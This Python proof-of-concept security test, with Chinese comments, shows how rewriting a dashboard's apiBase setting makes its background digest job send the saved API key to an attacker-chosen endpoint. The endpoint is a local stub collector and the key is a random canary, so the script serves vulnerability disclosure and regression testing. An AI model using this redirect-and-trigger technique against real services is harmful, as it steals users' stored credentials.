"""QUOT-44 PoC 2：写接口 → 修改 apiBase → 泄漏已保存的 API Key。

背景：POST /api/settings 可以修改接口地址；随后 POST /api/digest/run 会让
后台任务把 Authorization: Bearer <已保存密钥> 发往这个地址。
本 PoC 用 127.0.0.1 上的桩服务充当「攻击者接口」，金丝雀密钥为脚本随机生成，
不是真实密钥。

前置：完成 PoC 1 的写入访问（回环或本地反向代理）。
运行：python tests/security/poc_key_exfil.py
"""
from __future__ import annotations

import secrets
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path

from _harness import Collector, Dashboard, body_json, check, clean_env, finish, request
from tests.fixtures.configs import DEFAULT_DIGEST

from qf_wire.core.scheduler import today_beijing
from qf_wire.core.models import SourceItem
from qf_wire.sources.base import FetchResult
from qf_wire.storage.sqlite import WireStore

SIGNED = {"X-Wire-Request": "1"}

API_DIGEST = {
    "digest": {
        **DEFAULT_DIGEST["digest"],
        "provider": "api",
        "default_model": "poc-model",
        "api_base": None,
        "retries": 0,
    }
}


def seed_today_item(config) -> None:
    day = today_beijing()
    now = datetime.now(timezone.utc)
    store = WireStore(config.paths.db_path)
    try:
        store.record_run(
            run_id="poc-run",
            day=day,
            topic="semi",
            mode="run",
            status="success",
            exit_code=0,
            started_at=now,
            finished_at=now,
            results=[FetchResult(source_id="feed_a", source_name="Feed A", topic="semi")],
            items_by_topic={
                "semi": [
                    SourceItem(
                        title="Poc item",
                        url="http://127.0.0.1/1",
                        source_id="feed_a",
                        topic="semi",
                    )
                ]
            },
            events_by_topic={},
        )
        store.save_source_scores({})
    finally:
        store.close()


def main() -> None:
    canary = f"poc-canary-{secrets.token_hex(8)}"
    with tempfile.TemporaryDirectory(prefix="qf-poc-exfil-") as raw_tmp:
        tmp = Path(raw_tmp)
        with clean_env(tmp / ".env.local"), Collector() as collector, Dashboard(tmp, API_DIGEST) as dash:
            seed_today_item(dash.config)

            status, _, payload = request(
                dash.base,
                "/api/settings",
                method="POST",
                payload={
                    "provider": "api",
                    "apiBase": "http://127.0.0.1:1/v1",
                    "apiKey": canary,
                    "model": "poc-model",
                },
                headers=SIGNED,
            )
            check(status == 200, "用户已保存密钥（apiBase 指向不可达地址，密钥留在本地）")
            check(body_json(payload).get("hasKey") is True, "返回仅含密钥掩码 hasKey/keyHint")
            check(canary not in str(body_json(payload)), "设置接口响应未回显明文密钥（对照）")

            # 攻击者只知道接口形状：改 apiBase、不带 apiKey，沿用已保存的密钥
            status, _, payload = request(
                dash.base,
                "/api/settings",
                method="POST",
                payload={"provider": "api", "apiBase": collector.base, "model": "poc-model"},
                headers=SIGNED,
            )
            check(status == 200, "仅改 apiBase、不提交密钥也能保存成功")
            check(body_json(payload).get("hasKey") is True, "响应确认已保存密钥仍存在")

            status, _, payload = request(
                dash.base, "/api/digest/run", method="POST", payload={}, headers=SIGNED
            )
            check(status in (200, 202), f"生成任务已受理（{status}）")

            deadline = time.monotonic() + 15
            while time.monotonic() < deadline and not collector.records:
                time.sleep(0.1)

            check(bool(collector.records), "桩服务收到了模型请求")
            leaked = any(canary in record["authorization"] for record in collector.records)
            check(leaked, "桩服务在 Authorization 头中收到已保存的 API Key")
            if collector.records:
                record = collector.records[0]
                check(
                    record["path"].endswith("/chat/completions"),
                    f"请求路径为 {record['path']}（密钥随请求外发）",
                )

    finish("poc_key_exfil")


if __name__ == "__main__":
    main()
